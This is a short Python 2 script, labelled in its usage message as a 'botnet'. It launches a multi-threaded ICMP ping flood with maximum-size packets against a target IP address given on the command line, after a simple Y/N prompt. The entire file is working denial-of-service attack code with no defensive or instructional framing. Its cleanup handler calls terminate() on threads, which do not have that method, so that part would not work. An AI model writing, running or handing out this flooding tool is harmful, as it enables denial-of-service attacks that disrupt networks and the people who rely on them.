#!/usr/bin/python

import os, sys, signal
from time import sleep
from threading import Thread

processes = []

# *
# * Processes killing
# *
def signal_handler(signal, frame):
	for p in processes:
		p.terminate()

##############################################################################

# *
# * Start attacking specified ip address
# *
def attack(target):
    ping = "sudo ping "
    config = "-q -f -s 65507 "
    #hostname = "192.168.56.101"

    os.system(ping + config + target)

##############################################################################

def main():
	try:
		if(len(sys.argv)!=3):
		    print "[-]\tWrong number of parameters:\tUsage: ./botnet <ip_address> <number_of_threads>\n"
		    sys.exit(-1)

		target_ip = sys.argv[1]
		threads	= sys.argv[2]
		signal.signal(signal.SIGINT, signal_handler)

		d = ''
		while(d!='y' and d!='Y' and d!='n' and d!='N'):
		    d = raw_input("\n[+]\tStart ping flood attack (Y/N): ")

		if(d!='y' and d!='Y'):
		    print "[-]\tAborting program\n"
		    sys.exit(-1)

		print "[+]\tStarting", threads, "threads...\n"

		i=0
		while i!=int(threads):
			i+=1
			p=Thread(target=attack, args=[target_ip])         # Create threads and start attack
			p.start();
			processes.append(p)
			sleep(0.15)
			
	except KeyboardInterrupt:
		print "Shutdown requested. Exiting..."
		sys.exit(0)
		
##############################################################################

main()
